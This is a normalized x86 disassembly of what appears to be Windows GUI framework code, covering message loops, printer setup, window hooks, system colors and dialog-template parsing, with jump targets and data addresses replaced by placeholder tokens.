mov edx [ esp + 0x8 ]
push esi
mov eax [ edx + 0x4 ]
mov esi eax
dec esi
je r-xdata
push edx
push [ esp + 0xc ]
call sub_422d44
sub esi 0xe
je r-xdata
push ebx
xor ebx ebx
push edi
cmp eax 0x111
mov edi 0xf108
jne r-xdata
mov esi [ esp + 0x10 ]
push r--data
mov ecx esi
call sub_422fb1
test eax eax
je r-xdata
cmp [ edx + 0xc ] ebx
jne r-xdata
push r--data
mov ecx esi
call sub_422fb1
test eax eax
jne r-xdata
mov eax [ esi ]
push edi
push 0x1030
jmp r-xdata
push 0x1
pop ebx
inc edi
mov eax ebx
pop edi
pop ebx
jmp r-xdata
mov eax [ esi ]
push edi
push 0x10
mov ecx esi
call [ eax + 0x10 ]
pop esi
retn 0x8
sub_4228e8
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jg r-xdata
cmp edi 0x1
jne r-xdata
push edi
call sub_422b61
mov ecx [ esi + 0x80 ]
and [ ebp + 0x8 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
cmp edi 0x1
pop edi
pop esi
setl al
pop ebp
retn 0x4
push edi
mov ecx esi
call sub_422b61
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ esi + 0x80 ]
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x14 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x88 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
sub_422952
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_425000
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_425000
mov [ esi + 0x94 ] edi
sub_422a14
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
push esi
call sub_4270c5
mov esi eax
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_422d69
push 0xffffffff
call [ SetWindowsHookExA@IAT ]
push sub_4264dc
mov ecx rw-data
mov [ esi + 0x30 ] eax
call sub_427941
mov esi eax
cmp [ esi + 0x14 ] 0x0
je r-xdata
push sub_426aa5
mov ecx rw-data
call sub_4278ac
pop esi
call sub_4272f7
push [ eax + 0x8 ]
call [ esi + 0x14 ]
sub_422a85
push ecx
push ebx
push ebp
push esi
push edi
push 0x1
xor ebx ebx
mov esi ecx
pop edi
mov [ esp + 0x10 ] ebx
mov eax [ esi ]
mov ecx esi
call [ eax + 0x5c ]
test eax eax
je r-xdata
lea ebp [ esi + 0x30 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi ]
lea ebp [ esi + 0x30 ]
push ebp
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esi ]
inc [ esp + 0x10 ]
push eax
mov ecx esi
call [ edx + 0x60 ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push 0x1
mov [ esp + 0x14 ] ebx
pop edi
cmp edi ebx
jne r-xdata
xor edi edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
sub_422b04
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax + 0x4 ]
cmp esi 0x200
je r-xdata
mov edx [ eax + 0x14 ]
mov edi [ eax + 0x18 ]
cmp [ ecx + 0x5c ] edx
jne r-xdata
cmp esi 0xa0
je r-xdata
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x18 ]
mov [ ecx + 0x5c ] edx
mov [ ecx + 0x60 ] esi
mov eax [ eax + 0x4 ]
mov [ ecx + 0x64 ] eax
cmp [ ecx + 0x60 ] edi
jne r-xdata
cmp esi 0xf
je r-xdata
cmp esi [ ecx + 0x64 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp esi 0x118
jne r-xdata
pop edi
pop esi
retn 0x4
push 0x1
pop eax
sub_422b61
push ebx
push ebp
xor ebp ebp
push esi
cmp [ esp + 0x10 ] ebp
push edi
jg r-xdata
call sub_4272f7
add eax 0x1070
push sub_4269e3
mov ecx eax
call sub_4278ac
cmp [ eax + 0x10 ] ebp
jne r-xdata
mov edi [ ecx + 0x1c ]
mov ebx 0x363
cmp edi ebp
je r-xdata
xor eax eax
cmp [ esp + 0x14 ] ebp
pop edi
pop esi
pop ebp
pop ebx
setl al
retn 0x4
call sub_42348a
push 0x1
call sub_423493
call sub_4272f7
add eax 0x1070
push sub_4269e3
mov ecx eax
call sub_4278ac
mov esi [ eax + 0x8 ]
mov eax [ edi + 0x1c ]
cmp eax ebp
je r-xdata
cmp [ esi + 0x1c ] ebp
je r-xdata
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov esi [ esi + 0x54 ]
jmp r-xdata
cmp esi edi
je r-xdata
push ebp
push 0x1
pop esi
push esi
push ebx
push [ edi + 0x1c ]
push edi
call sub_41f226
push esi
push esi
push ebp
push esi
push ebx
push [ edi + 0x1c ]
call sub_4209af
cmp esi ebp
je r-xdata
cmp [ esi + 0x88 ] ebp
jne r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
push ebp
mov ecx esi
call sub_421b8c
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
push esi
call sub_41f226
push 0x1
push 0x1
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
call sub_4209af
cmp [ esi + 0x88 ] ebp
jl r-xdata
or [ esi + 0x88 ] 0xffffffff
push eax
mov ecx esi
call sub_421b8c
mov eax [ esi + 0x88 ]
cmp eax ebp
jle r-xdata
sub_422c6c
push ecx
mov eax [ ecx ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] ecx
call [ eax + 0x28 ]
mov esi eax
xor ebp ebp
cmp esi ebp
je r-xdata
xor eax eax
mov ebx [ esp + 0x18 ]
mov edi 0xc000
mov eax [ esi + 0x4 ]
push ebp
push ebp
push edi
push ebp
push ebp
push eax
push [ esi + 0x4 ]
call sub_4200f2
cmp eax ebp
jne r-xdata
mov esi [ esi ]
cmp esi ebp
jne r-xdata
mov ecx [ eax + 0x10 ]
mov ecx [ ecx ]
cmp ecx [ ebx + 0x4 ]
je r-xdata
push [ ebx + 0xc ]
mov ecx [ esp + 0x14 ]
push [ ebx + 0x8 ]
call [ eax + 0x14 ]
push 0x1
pop eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp eax edi
jae r-xdata
jmp r-xdata
push ebp
push ebp
push edi
add eax 0x18
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
push eax
call sub_4200f2
cmp eax ebp
je r-xdata
sub_422ce7
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
jne r-xdata
call sub_408750
mov esi eax
test esi esi
je r-xdata
push edi
call sub_422c6c
test eax eax
jne r-xdata
push edi
push eax
call sub_420a57
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x4
xor eax eax
push [ edi ]
call sub_41f3e7
mov ecx eax
call sub_42089b
cmp eax esi
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x90 ]
jmp r-xdata
sub_422d44
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
jne r-xdata
cmp eax 0xf
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push 0x0
push [ ecx ]
call [ ValidateRect@IAT ]
retn 0x8
sub_422d69
push esi
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
mov esi [ esp + 0x8 ]
jne r-xdata
push sub_426477
mov ecx rw-data
call sub_4278ac
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push esi
push [ eax + 0x30 ]
call [ CallNextHookEx@IAT ]
test esi esi
jge r-xdata
call sub_4229ff
test eax eax
je r-xdata
cmp esi 0x8001
jne r-xdata
push [ esp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push esi
call [ edx + 0x70 ]
jmp r-xdata
pop esi
retn 0xc
sub_422dc1
mov eax [ esp + 0x4 ]
push esi
cmp [ eax + 0x4 ] 0x100
jne r-xdata
xor eax eax
cmp [ eax + 0x8 ] 0x70
jne r-xdata
mov eax [ eax + 0xc ]
shr eax 0x10
test ah 0x40
jne r-xdata
mov esi [ GetKeyState@IAT ]
push 0x10
call esi
test ax ax
jl r-xdata
push 0x11
call esi
test ax ax
jl r-xdata
push 0x12
call esi
test ax ax
jl r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_422e0c
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax ebx
je r-xdata
call sub_408750
cmp [ rw-data ] 0x333
mov edi eax
jae r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
push [ esi ]
call sub_41f3e7
cmp eax ebx
je r-xdata
sub eax 0x7fff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] ebx
je r-xdata
push esi
call sub_422dc1
test eax eax
je r-xdata
mov ecx eax
call sub_4208c3
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
push ebx
push 0xe146
push 0x111
push [ edi + 0x1c ]
jmp r-xdata
mov ecx edi
call sub_42191c
test eax eax
je r-xdata
cmp eax 0x108
ja r-xdata
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ edi + 0x50 ] ebx
je r-xdata
push sub_426477
mov ecx rw-data
call sub_4278ac
mov ebx eax
cmp [ ebx + 0xbc ] 0x0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
call sub_408750
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
push 0x7
lea edi [ ebp - 0x20 ]
pop ecx
mov [ ebx + 0xbc ] 0x1
[ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
mov ecx [ esi + 0x20 ]
call sub_421bb3
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov ecx [ esi + 0x4 ]
cmp ecx 0x100
jne r-xdata
and [ ebx + 0xbc ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
test eax eax
je r-xdata
cmp ecx 0x202
jne r-xdata
cmp [ esi + 0x8 ] 0xd
je r-xdata
and [ ebx + 0xbc ] 0x0
push ebx
push 0xe146
push 0x111
push [ eax + 0x1c ]
sub_422f71
push esi
mov esi ecx
xor eax eax
push edi
push eax
lea edi [ esi + 0x30 ]
push eax
push eax
push edi
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
retn
cmp [ esi + 0x34 ] 0x36a
je r-xdata
push 0x1
pop eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x58 ]
test eax eax
jne r-xdata
push edi
call [ TranslateMessage@IAT ]
push edi
call [ DispatchMessageA@IAT ]
sub_422fe3
mov eax sub_42ae28
call sub_410a78
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_42306a
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_425926
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42595e
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_4230bf
push esi
push edi
mov edi [ esp + 0xc ]
xor eax eax
cmp edi eax
mov esi ecx
jne r-xdata
push edi
call sub_4231b8
pop ecx
push eax
push edi
mov ecx esi
call sub_4230ee
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
sub_4230ee
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
add eax 0x40
push eax
push 0x40
call [ GlobalAlloc@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
pop esi
retn 0x8
push edi
push eax
call [ GlobalLock@IAT ]
push [ esi + 0x4 ]
mov edi eax
push [ esp + 0x10 ]
push edi
call sub_410ff0
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
jne r-xdata
mov eax [ edi ]
mov eax [ edi + 0xc ]
jmp r-xdata
push [ esi ]
not eax
shr eax 0x6
and eax 0x1
mov [ esi + 0x8 ] eax
call [ GlobalUnlock@IAT ]
push 0x1
pop eax
pop edi
sub_423162
mov eax [ esp + 0x4 ]
cmp [ eax + 0x2 ] 0xffff
jne r-xdata
add eax 0x12
add eax 0x1a
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax edx
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
retn
sub_4231b8
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
cmp [ ebx + 0x2 ] 0xffff
push ebx
sete al
mov esi eax
call sub_423162
cmp [ ebx + 0x2 ] 0xffff
pop ecx
jne r-xdata
mov ecx [ ebx ]
mov ecx [ ebx + 0xc ]
jmp r-xdata
test esi esi
je r-xdata
mov ecx esi
push edi
neg ecx
sbb ecx ecx
and ecx 0x2
inc ecx
lea edi [ eax + ecx * 2 ]
push edi
call sub_411325
pop ecx
lea eax [ edi + eax * 2 + 0x2 ]
pop edi
test cl 0x40
je r-xdata
mov cx [ ebx + 0x8 ]
mov cx [ ebx + 0x10 ]
jmp r-xdata
sub eax ebx
pop esi
pop ebx
retn
neg esi
sbb esi esi
and esi 0x6
add esi 0x12
movzx edx cx
test cx cx
jbe r-xdata
add eax 0x2
add eax 0x4
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x2
add eax 0x4
jmp r-xdata
test cx cx
je r-xdata
movzx ecx [ eax ]
dec edx
lea eax [ eax + ecx + 0x2 ]
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x3
and al 0xfc
add eax esi
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
test cx cx
je r-xdata
sub_423270
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x2 ] 0xffff
jne r-xdata
mov eax [ esi ]
mov eax [ esi + 0xc ]
jmp r-xdata
push esi
call sub_423162
mov edx [ esp + 0x14 ]
pop ecx
mov cx [ eax ]
push 0x0
mov [ edx ] cx
xor ecx ecx
cmp [ esi + 0x2 ] 0xffff
push 0x0
push 0x20
push 0x20
setne cl
dec ecx
and ecx 0x2
inc ecx
lea esi [ eax + ecx * 2 ]
mov ecx [ esp + 0x1c ]
call sub_4227bc
push eax
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ecx [ esp + 0xc ]
push 0xffffffff
call sub_422794
push 0x1
pop eax
pop esi
retn
xor eax eax
pop esi
retn
test al 0x40
jne r-xdata
sub_4232df
push ebp
mov ebp esp
sub esp 0x50
push edi
xor edi edi
cmp [ ecx + 0x4 ] edi
mov [ ebp - 0x8 ] ecx
jne r-xdata
push ebx
push esi
push [ ecx ]
call [ GlobalLock@IAT ]
mov ebx eax
xor ecx ecx
mov ax [ ebx + 0x2 ]
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x4 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ ebx + 0xc ]
jmp r-xdata
pop edi
leave
retn 0x8
or [ ebx ] 0x40
or [ ebx + 0xc ] 0x40
jmp r-xdata
mov esi [ ebp - 0x4 ]
and eax 0x40
neg esi
sbb esi esi
mov [ ebp - 0xc ] eax
and esi 0x2
inc esi
shl esi 0x1
cmp [ ebp - 0x4 ] edi
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edi + 0x3 ]
and al 0xfc
lea edi [ edi + edx + 0x3 ]
mov [ ebp - 0xc ] eax
and edi 0xfffffffc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ edi + esi ]
push eax
call sub_411325
pop ecx
lea ecx [ esi + eax * 2 + 0x2 ]
lea eax [ ebp - 0x50 ]
push 0x20
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ esi + eax * 2 ]
push ebx
mov [ ebp + 0x8 ] eax
call sub_423162
pop ecx
mov edi eax
xor ecx ecx
mov [ ebp - 0x10 ] edi
cmp [ ebp - 0xc ] ecx
je r-xdata
mov dx [ ebx + 0x8 ]
mov dx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp + 0xc ]
sub eax esi
push eax
mov [ ecx ] dx
lea eax [ ebp - 0x50 ]
add ecx esi
push eax
push ecx
call sub_411580
mov esi [ ebp - 0x8 ]
sub edi [ ebp - 0xc ]
add esp 0xc
push [ esi ]
add [ esi + 0x4 ] edi
call [ GlobalUnlock@IAT ]
and [ esi + 0x8 ] 0x0
push 0x1
pop eax
pop esi
pop ebx
test dx dx
jbe r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
sub ebx eax
add ebx [ ecx + 0x4 ]
push ebx
push eax
push edi
call sub_411580
add esp 0xc
sub_4233f9
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
mov esi [ GetStockObject@IAT ]
push edi
push 0xa
mov [ ebp - 0x4 ] ecx
pop ebx
mov edi r--data
push 0x11
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
push 0x3c
push eax
call [ GetObjectA@IAT ]
test eax eax
je r-xdata
push 0xd
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
lea edi [ ebp - 0x24 ]
call [ GetDC@IAT ]
mov esi eax
mov eax [ ebp - 0x40 ]
test eax eax
jge r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
call sub_4232df
pop edi
pop esi
pop ebx
leave
retn 0x4
mov [ ebp + 0x8 ] ebx
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
push eax
push 0x48
push [ ebp - 0x40 ]
call [ MulDiv@IAT ]
push esi
push 0x0
mov ebx eax
call [ ReleaseDC@IAT ]
neg eax
mov [ ebp - 0x40 ] eax
sub_423493
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42731d
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
cmp eax esi
je r-xdata
xor eax eax
pop edi
cmp [ ebx + 0x10 ] eax
pop esi
pop ebx
setne al
pop ebp
retn 0x4
dec eax
cmp eax esi
mov [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
call sub_4272f7
mov edi [ eax + 0x4 ]
push sub_426477
mov ecx rw-data
call sub_4278ac
test edi edi
mov esi eax
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
call sub_4236b1
mov ecx [ ebx + 0x1c ]
call sub_4236b1
mov ecx [ ebx + 0x18 ]
call sub_4236b1
mov ecx [ ebx + 0x14 ]
call sub_4236b1
mov ecx [ ebx + 0x24 ]
call sub_4236b1
call sub_4229ff
cmp eax esi
je r-xdata
cmp [ edi + 0xb8 ] 0x0
je r-xdata
push eax
call sub_411e9e
cmp eax [ edi + 0xb8 ]
pop ecx
jae r-xdata
mov eax [ eax + 0x54 ]
cmp eax esi
je r-xdata
mov eax [ esi + 0xc ]
and [ ebp + 0x8 ] 0x0
test eax eax
je r-xdata
push esi
push esi
call eax
push [ edi + 0xb8 ]
call sub_410b8c
test eax eax
pop ecx
mov [ esi + 0xc ] eax
jne r-xdata
push eax
call sub_411e9e
push [ esi + 0xc ]
mov [ ebp + 0x8 ] eax
call sub_410cc6
pop ecx
pop ecx
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_410b8c
pop ecx
mov [ esi + 0xc ] eax
sub_42358d
mov eax sub_42ae56
call sub_410a78
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_41e382
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_41e382
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_41e3c5
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_4235f2
mov eax sub_42ae60
call sub_410a78
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_41e4f6
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_41e4f6
test eax eax
je r-xdata
push sub_425036
call sub_4221a7
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_422fe3
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_41e529
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_4221a7
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_41dc26
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_4236b1
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_41e40a
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41e5bb
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_423716
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_42375a
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_427b2c
call sub_427afc
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_4237b2
mov eax sub_42aed2
call sub_410a78
push esi
call sub_42731d
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_425036
call sub_4221a7
push 0x48
mov ebx eax
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_42358d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_4221a7
pop ebx
sub_423857
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4237b2
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41e579
sub_423897
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_42391b
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_422601
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_422745
push eax
push [ ebp + 0x8 ]
call sub_42391b
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_422794
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_42391b
push esi
call sub_4272f7
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_423997
mov eax sub_42b393
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_422478
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x8 ] 0x0
je r-xdata
call sub_423c6f
sub_4239df
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx ecx
push 0x10
call sub_4221b9
test eax eax
pop ecx
je r-xdata
xor edi edi
push 0xffffffff
mov ecx eax
call sub_423978
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
